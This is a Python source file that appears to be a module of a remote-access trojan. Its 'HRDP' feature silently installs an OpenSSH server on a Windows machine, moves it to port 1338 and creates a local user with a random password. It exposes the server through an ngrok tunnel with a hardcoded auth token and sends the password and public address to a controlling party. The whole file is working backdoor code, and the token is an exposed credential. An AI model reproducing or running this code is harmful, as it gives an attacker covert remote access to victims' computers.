import subprocess
import random
import string
import os
import time

from pyngrok import conf, ngrok
import config as config


def shell_command(command):
    """ Silently execute a shell command """
    subprocess.call(command, shell=True)  # , creationflags=0x08000000


def get_random_password():
    """ Returns a randomly generated password """
    password_characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(password_characters) for i in range(8))
    return password


def install_ssh_server():
    """ Installs and sets up SSH server on port 1338"""
    # Start and configure SSH server
    shell_command(['PowerShell', '-Command', 'Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0'])  # Download SSH server
    shell_command('net start sshd')  # Start SSH Server

    # Change the default port of the SSH server from 22 to 1338
    ssh_config_file = 'Port 1338\nAuthorizedKeysFile	.ssh/authorized_keys\nSubsystem	sftp	sftp-server.exe\nMatch Group administrators\n           AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys\n'
    with open(os.path.expandvars('%programdata%\ssh\sshd_config'), 'w') as f:
        f.write(ssh_config_file)


def uninstall_ssh_server():
    """ Uninstalls SSH server """
    shell_command('net stop sshd')  # Stops the SSH Server
    shell_command(['PowerShell', '-Command', 'Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0'])  # Removes the SSH server from the computer


def start(server):
    # Notice, if HRDP doesnt do anything, make sure it has admin perms

    # Restarts SSH server
    stop()

    # Set up port forwarding to the SSH server with ngrok
    # ngrok_auth_token = input('Input Ngrok Token> ')
    ngrok_auth_token = '1szl7cSIlS7Y20k2mkQLZv2OLQT_3ybuL4qxrvFFtEcGp381h'
    conf.get_default().region = 'us'
    ngrok.set_auth_token(ngrok_auth_token)
    ssh_tunnel = ngrok.connect(1338, 'tcp')
    print(ssh_tunnel)

    time.sleep(1.5)
    shell_command('net start sshd')  # Starts the SSH Server

    # Create new user for the SSH server
    password = get_random_password()
    shell_command('net user ssh-rdp-server {} /ADD'.format(password))
    time.sleep(1.5)
    config.send_to_client(server, config.targets[0], 'hrdp', response=False)  # Sends flag to let the client prepare to handle hrdp
    time.sleep(1.5)
    config.send_to_client(server, config.targets[0], password, response=False)  # Sends the password of the ssh user to the client
    time.sleep(1.5)
    config.send_to_client(server, config.targets[0], ssh_tunnel.public_url[6:], response=False)  # Sends the ip:port of the ssh server
    time.sleep(1.5)
    print(password)
    print(ssh_tunnel.public_url[6:])
    print('Done starting')


def stop():
    # Notice, if HRDP doesnt do anything, make sure it has admin perms
    shell_command('net stop sshd')  # Stops the SSH Server
    shell_command('net user ssh-rdp-server /DELETE')  # Deletes the SSH user
    ngrok.kill()  # Stops ssh port forwarding
